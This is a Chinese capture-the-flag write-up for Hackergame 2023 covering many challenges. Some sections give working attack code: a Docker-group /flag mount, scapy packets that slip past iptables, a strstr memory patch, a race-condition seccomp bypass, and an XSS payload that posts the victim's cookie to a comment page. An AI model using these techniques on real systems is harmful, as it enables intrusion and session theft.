# 我的 Hackergame 2023 writeup

by huige233 scored 5300 ranked 27

## hackergame 启动

网页内录音频即可

即 先点击录制 然后点击播放示例

##  猫咪小测

1.查询中科大图书馆管理网站可得 12

2.查询[论文](https://arxiv.org/abs/2303.17626) 可得 23

3.简单查询可得 CONFIG_TCP_CONG_BBR

4.简单查询找到[论文](https://drops.dagstuhl.de/opus/volltexte/2023/18237/pdf/LIPIcs-ECOOP-2023-44.pdf) ECOOP

## 更深更暗

思路：因为题目内提到泰坦号残骸一瞬间看到

检查js可知flag藏在了元素内

F12打开开发者工具找到`id="titan"`的pre块

## 旅行图片3.0

1~2题 根据上午图片检索可得 研究所编号ICRR

日期枚举2023-07-01到2023-08-31可得2023-08-10

3~4题 根据背景检索寻找到[网址](https://umeshu-matsuri.jp/tokyo_staff/) 可得 编号S495584522

哈哈学长是东京大学的 门票不要钱 ~~谁知道我猜了多久啊喂~~

5~6题 这反而没什么好说的 通过Google全景地图检索

可得 5题答案安田讲堂和6题答案熊猫-秋田犬

## 赛博井字棋

用f12打开控制台查看网络包发现每次都会有一个fetch包发出

使用burpsuite拦截并修改其中一次xy即可获胜

## 奶奶的睡前 flag 故事

```text
（以下内容由 GPT 辅助编写，如有雷同纯属巧合）

晴空万里的假期终于拍了拍翅膀飞来了。对于一心想扔掉教材、砸掉闹钟、跃向世界的 L 同学来说，期待了整整三年的跨国旅游大业终于是时候启动了，还能巧妙地顺带着做个美满的老友记。

可是，哎哟喂，他刚踩上波光粼粼的金沙海滩，那他最疼爱的华为手机就跟着海风一起去约会了大海，连他的钱包也在这场未知探索之旅中神秘失踪。

「这个地方怎么连个华为手机都不卖。若是买个苹果手机，心疼的是它连个实体 SIM 卡槽都藏起来了，回国肯定成了个大摆设。不如来个谷歌的『亲儿子』？」L 同学踌躇满志地嘀咕道。

那时，像是上天的安排，「咱这儿正好有个谷歌『亲儿子』的老手机，你拿去逍遥吧」。

L 同学满眼星光地接过，连系统都没心思升级，就开始疯狂安装那个久闻大名的 GPT 程序，甚至雀跃地在群里晒出一张跟 GPT 对话的精彩截图，一时间成为了群里的焦点人物。
```

题干中加粗字体为 **谷歌的『亲儿子』**  **连系统都没心思升级** **截图**

简单检索可得漏洞 [ACropalypse](https://en.wikipedia.org/wiki/ACropalypse)

使用[在线网站](https://acropalypse.app/) 直接破解可得 flag

## 组委会模拟器

简单尝试可知 需要点击所有消息里面带有hack[]的部分完成撤回

简单写了个js脚本

```js
setInterval(function() {
    var elements = document.querySelectorAll('.fakeqq-container *');
    for (var i = 0; i < elements.length; i++) {
        if (/hack\[.*\]/.test(elements[i].textContent)) {
            elements[i].click();
        }
    }
}, 300);
```

控制台打开输入即可

## 虫

这时，你看到一只昆虫落在你面前，发出奇怪的叫声。你把这段声音录制了下来：这听起来像是一种**通过无线信道传输图片的方式**，如果精通此道，或许就可以接收来自国际空间站（ISS）的图片了。

题干可知 和ISS相关

下载软件MMSSTV即可将音频转换为flag

## JSON ⊂ YAML?

简单查询搜索后得知 yaml 会把某些特定的数字当字符串解析

并找到[网站](https://ruudvanasseldonk.com/2023/01/11/the-yaml-document-from-hell) 

构造json {"a":1,"a":1e2}

yaml1.1不能解析1e2 但是json可以
yaml1.2不支持相同的 key 所以通过

## Git? Git!

从题干可得 已经提交但是撤回了

可以从history里面寻找

首先使用`git reflog`

然后找到505e1a3

输入命令 `git reset --hard 505e1a3`

## HTTP 集邮册

`你目前收集到了 13 个状态码：[100, 200, 206, 304, 400, 404, 405, 412, 413, 414, 416, 501, 505]`

- 100 ：Expect: 100-continue
- 200 ：直接原样发送即可
- 206 ：Range: bytes=1-
- 304 ：If-Modified-Since: Fri, 03 Nov 2023 12:36:15 GMT(获取时间请用new Date().toGMTString())
- 400 ：任意不符合格式的即可 本人用的`Host:example.com/a`
- 404 ：有很多解法 本人用的`GET /1234-1234`
- 405 ：POST / HTTP/1.1
- 412 ：If-Unmodified-Since: Thu, 01 Jan 1970 00:00:00 GMT
- 413 ：Content-Length: 1048577
- 414 ：在`GET /`填充大量字符串
- 416 ：Range: bytes=9999999-
- 501 ：Transfer-Encoding: identity
- 505 ：HTTP/2.1

至于无状态码非常简单 只需要把第一行换成 `GET /HTTP/1.1` 即可

## Docker for Everyone

题意可得 用户都被加入了 docker 用户组 并且 `/flag`是软连接

所以只需要对 docker 容器操作即可

打开 terminal 发现有`alpine`守护进程

输入 `docker run -it -v /flag:/flag --rm alpine`

把docker挂载到 `/flag`下

然后输入`cat /flag` 即可

## 惜字如金 2.0

```java
public class CrackSeed_Again {
	static EasyProgressBar bar = new EasyProgressBar("Seed");
	public static void main(String[] args) throws Exception {

		char[][] ctab = {"nymeh1niwemflcir}echaete".toCharArray(),
						 "a3g7}kidgojernoetlsup?he".toCharArray(),
						 "ulw!f5soadrhwnrsnstnoeqe".toCharArray(),
						 "ct{l-findiehaai{oveatase".toCharArray(),
						 "ty9kxborszstguyd?!blm-pe".toCharArray()};
		tryRecursion(4, ctab, null);

		TaskPool.Common().awaitFinish();
		System.out.println("done!");
	}
	static final int[] KEY = new int[]{53, 41, 85, 109, 75, 1, 33, 48, 77, 90,
										17, 118, 36, 25, 13, 89, 90, 3, 63, 25,
										31, 77, 27, 60, 3, 118, 24, 62, 54, 61,
										25, 63, 77, 36, 5, 32, 60, 67, 113, 28};
	private static String decrypt(char[] cod_dict) {
		int set = 0;
		CharList out = IOUtil.getSharedCharBuf();
		for (int i : KEY) {
			out.append(cod_dict[i]);
		}
		if (!out.startsWith("flag{you-ve-r") || !out.endsWith("}")) return null;
		return out.toString();
	}
	private static void tryRecursion(int depth, char[][] input_array, TextWriter out) {
		if (depth < 0) {
			bar.addCurrent(1);
			char[] outarr = new char[24*5];
			for (int i = 0; i < 5; i++) {
				System.arraycopy(input_array[i], 0, outarr, 24*i, 24);
			}
			String decrypt = decrypt(outarr);
			if (decrypt != null) {
				System.out.println(decrypt);
			}
			return;
		}

		char[] ca = input_array[depth];
		char[] tmp = new char[24];
		input_array[depth] = tmp;

		//第一原则（又称 creat 原则）：如单词最后一个字母为「e」或「E」，且该字母的上一个字母为辅音字母，则该字母予以删除。
		//第二原则（又称 referer 原则）：如单词中存在一串全部由完全相同（忽略大小写）的辅音字母组成的子串，则该子串仅保留第一个字母。
		for (int i = 0; i < ca.length; i++) {
			System.arraycopy(ca, 0, tmp, 0, i);
			tmp[i] = 'e';
			System.arraycopy(ca, i, tmp, i+1, 23-i);
			tryRecursion(depth-1, input_array, out);
		}
		for (int i = 1; i < ca.length; i++) {
			System.arraycopy(ca, 0, tmp, 0, i);
			tmp[i] = ca[i-1];
			System.arraycopy(ca, i, tmp, i+1, 23-i);
			tryRecursion(depth-1, input_array, out);
		}
	}
}
```

按照原则反向操作即可

## 🪐 高频率星球

查询文件格式后发现 可以使用JSON+ESC转义获取终端内容

但是打印时发现会清屏并且设置窗口大小

将几种管理终端属性的转义字符替换掉

然后使用`JANSI`打印

Ansi.systemInstall() -Dansi=strip

## 🪐 小型大语言模型星球

第一问非常简单 直接复读即可

第二问 通过以下脚本爆破

``` python
import itertools

ss=tokenizer.decode([67,14396], skip_special_tokens=True)
print(ss)

strs = "abcdefghijklmnopqrstuvwxyz,. " #此处有一个空格
for j in range(3,7):
    print("range="+str(j))
    for i in itertools.product(str,repeat=j):
        i = ''.join(i)
        #print(i)
        bot(i)
```

爆破得到解 `dju`

## 🪐 流式星球

通过题目可知 从bin中可以获取到图片内容

 ```java
public static void main(String[] args) throws{
    int i = 0;
    FileInputStream in = new FileInputStream("D:\\Desktop\\vedio.bin");
    while(true){
        i++;
        BufferedImage img = new BufferedImage(427,759,BufferdImage.TYPE_3BYTE_BGR);
        byte[] data = ((DataBufferByte) img.getRaster().getDataBuffer()).getData();
        IOUtil.readFully(in, data);
        ImageIO.write(img,"png",new File("D:\\Desktop\\image\\"+i+".png"));
    }
}
 ```

可以用ffmpeg合并，或者直接看图

427和759是穷举出来的

先算width后算height

## 🪐 低带宽星球

第一问使用在线工具无损压缩到png-8格式即可

## Komm, süsser Flagge

题目中的iptables如下

```txt
*filter
:INPUT ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
:FORWARD DROP [0:0]
:myTCP-1 - [0:0]
:myTCP-2 - [0:0]
:myTCP-3 - [0:0]
-A INPUT -p tcp --dport 18080 -j myTCP-1
-A INPUT -p tcp --dport 18081 -j myTCP-2
-A INPUT -p tcp --dport 18082 -j myTCP-3

-A myTCP-1 -p tcp -m string --algo bm --string "POST" -j REJECT --reject-with tcp-reset

-A myTCP-2 -p tcp -m u32 --u32 "0 >> 22 & 0x3C @ 12 >> 26 @ 0 >> 24 = 0x50" -j REJECT --reject-with tcp-reset

-A myTCP-3 -p tcp -m string --algo bm --from 0 --to 50 --string "GET / HTTP" -j ACCEPT
-A myTCP-3 -p tcp -j REJECT --reject-with tcp-reset
COMMIT
```

第一问 识别字符串 `POST` 返回 rst

只需要发P 再发 OST即可

第二问同理 不过需要等待时间让iptables抛弃数据

第三问需要以下两个脚本

main.py

```python
from scapy.all import *
from scapy.layers.inet import IP, TCP, IPOption

import ipoption


def tcp_test(ip, port, data):
    # 第一次握手，发送SYN包
    # 请求端口和初始序列号随机生成
    p1 = IP(dst=ip,
            options=[IPOption(ipoption.streamid(b'\x00\x00\x47\x45\x54\x20\x2f\x20\x48\x54\x54\x50'))],
            ) / TCP(dport=port, sport=RandShort(), seq=RandInt(), flags='S')
    p1.show()
    print(bytes(p1))
    ans = sr1(p1, verbose=True)
    print(ans)

    # 假定此刻对方已经发来了第二次握手包：ACK+SYN

    # 对方回复的目标端口，就是我方使用的请求端口（上面随机生成的那个）
    sport = ans[TCP].dport
    s_seq = ans[TCP].ack
    d_seq = ans[TCP].seq + 1

    # 第三次握手，发送ACK确认包，顺带把数据一起带上
    print(sr1(IP(dst=ip,
                 options=[IPOption(ipoption.streamid(b'\x00\x00\x47\x45\x54\x20\x2f\x20\x48\x54\x54\x50'))],
                 ) / TCP(dport=port, sport=sport, ack=d_seq, seq=s_seq, flags='A') / data, verbose=False))

if __name__ == '__main__':
    data = 'POST / HTTP/1.1\r\n'
    data += 'Host: 202.38.93.111\r\n'
    data += 'User-Agent: GET / HTTP Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36\r\n'
    data += 'Content-Length: 115\r\n'
    data += 'Accept: text/html\r\n\r\n'
    data += 'youtoken\r\n'

    tcp_test("202.38.93.111", 18082, data)

```

ipoption.py

```python
from scapy.all import sr1
import ipaddress as ipa


def record_route(hop=1):
    if hop >= 10:
        raise Exception('exceed the max length of ip header')
    length = chr(hop * 4 + 3)
    option_head = b'\x07' + length.encode() + b'\x04'
    route_data = "".join(['\x00'] * 4 * hop)
    option = option_head + ('%s' % route_data).encode()
    return option


def lsrr(*source_route_table):
    hop = len(source_route_table)
    if hop >= 10:
        raise Exception('exceed the max length of ip header')
    length = chr(hop * 4 + 3)
    option_head = b'\x83' + length.encode() + b'\x04'
    option = option_head
    for ip in source_route_table:
        ip = ipa.v4_int_to_packed(int(ipa.IPv4Address(ip)))
        option = option + ip
    return option


def ssrr(*source_route_table):
    hop = len(source_route_table)
    if hop >= 10:
        raise Exception('exceed the max length of ip header')
    length = chr(hop * 4 + 3)
    option_head = b'\x89' + length.encode() + b'\x04'
    option = option_head
    for ip in source_route_table:
        ip = ipa.v4_int_to_packed(int(ipa.IPv4Address(ip)))
        option = option + ip
    return option


def timestamp(flag=0, hop=1, *specified_route):
    if flag == 0:
        if hop >= 10:
            raise Exception('exceed the max length of ip header')
        length = chr(hop * 4 + 4)
        option_head = b'\x44' + length.encode() + b'\x05\x00'
        route_data = "".join(['\x00'] * 4 * hop)
        option = option_head + ('%s' % route_data).encode()
        return option
    if flag == 1:
        if hop >= 5:
            raise Exception('exceed the max length of ip header')
        length = chr(hop * 8 + 4)
        option_head = b'\x44' + length.encode() + b'\x05\x01'
        route_data = "".join(['\x00'] * 8 * hop)
        option = option_head + ('%s' % route_data).encode()
        return option
    if flag == 3:
        hop_check = len(specified_route)
        if hop_check != hop:
            raise Exception('the number of routes is not consistent with hops')
        if hop >= 5:
            raise Exception('exceed the max length of ip header')
        length = chr(hop * 8 + 4)
        option_head = b'\x44' + length.encode() + b'\x05\x03'
        option = option_head
        for ip in specified_route:
            ip = ipa.v4_int_to_packed(int(ipa.IPv4Address(ip)))
            option = option + ip + b'\x00\x00\x00\x00'
        return option
    raise Exception('no such flag, flag must be set as 0,1,3 in timastamp option')


def streamid(byte_id):
    return b'\x88\x0E' + byte_id

```

参考文档 [链接](https://cloud.tencent.com/developer/article/1832077)

## 为什么要打开 /flag 😡

第一问 LD_PRELOAD, love!

从小问题目可知 要通过 `LD_PRELOAD` 劫持原本的函数让他返回正常值

```c
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <stdint.h>
#include <errno.h>

char* my_strstr(const char* heystack, const char* needle) {
	return NULL;
}

uint8_t my_strstr_amd64[] = {
	0xf3, 0x0f, 0x1e, 0xfa,	
	0x55,
	0x48, 0x89, 0xe5,
	0x48, 0x89, 0x7d, 0xf8,
	0x48, 0x89, 0x75, 0xf0,
	0xb8, 0x00, 0x00, 0x00, 0x00,
	0x5d,
	0xc3
};

void hook_strstr() {
	void* target = (void*)strstr;
	void* page = (void*)( ((uintptr_t)target >> 12)<< 12);
	const int page_size = 4096;
	fprintf(stderr, "strstr at %p, assume page %p\n", target, page);
	int r1 = mprotect(page, 2*page_size, PROT_READ | PROT_WRITE);
	if (r1 != 0) {
		fprintf(stderr, "mprotect(): %d\n", errno);
		return;
	}
	memcpy(target, my_strstr_amd64, sizeof(my_strstr_amd64));
	mprotect(page, 2*page_size, PROT_EXEC | PROT_WRITE);
}

int main() {
	hook_strstr();
	FILE* f = fopen("flag", "r");
	if (f == NULL) {
		printf("Cannot open file!\n");
		return 0;
	}
	char c;
	while ((c=fgetc(f)) != EOF) {
		fputc(c, stdout);
	}
	return 0;
}
```

第二小问 都是 seccomp 的错

```c
#define _GNU_SOURCE
#include <stdlib.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sched.h>
#include <emmintrin.h>
#define SSIZE 8192
#define BYTES 8192

char filename[] = {[0]='/', [1]='f', [2]='l', [3]='a', [4]=0, [5]=0};
char buffer[BYTES + 1];
_Alignas(16) char stack[SSIZE];

int side() {
	for(int i = 0;i < (1 << 11 | 1 << 10 | 1 << 9);i++){
		_mm_pause();
	}
	printf("Sync.");
	filename[4] = 'g';
	_mm_mfence();
	return 0;
}

int main() {
	clone(side, stack + SSIZE - 8, CLONE_SIGHAND|CLONE_FS|CLONE_VM|CLONE_FILES|CLONE_THREAD,0);
	int fd = open(filename,O_RDONLY);
	read(fd,buffer,BYTES);
	printf("%s",buffer);
	return 0;
}
```

## 异星歧途

这题其实并没什么好说的

进入游戏查看处理器阅读汇编即可

最终序列 `10100101110001001000110001110111`

## 微积分计算小练习 2.0

在留言页面发现，留言是直接拼接字符串得来的

所以构造`"+window["name"]+"` 

反复执行脚本

```html
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
<img src="x" onerror="openPage()" alt="error">
<script>
    function openPage() {
        var str = `<img src="x" onerror='fetch("/result", {method:"POST",headers:{
    "Content-Type": "application/x-www-form-urlencoded"
    },body:"comment="+btoa(document.cookie).slice(72,96)});'>`;
        window.open('http://web/result', str);
        return 0;
    }
</script>
</body>
</html>
```

分段拆解btoa后的cookie输出

获取到base64后的cookie

然后UrlDecode解码
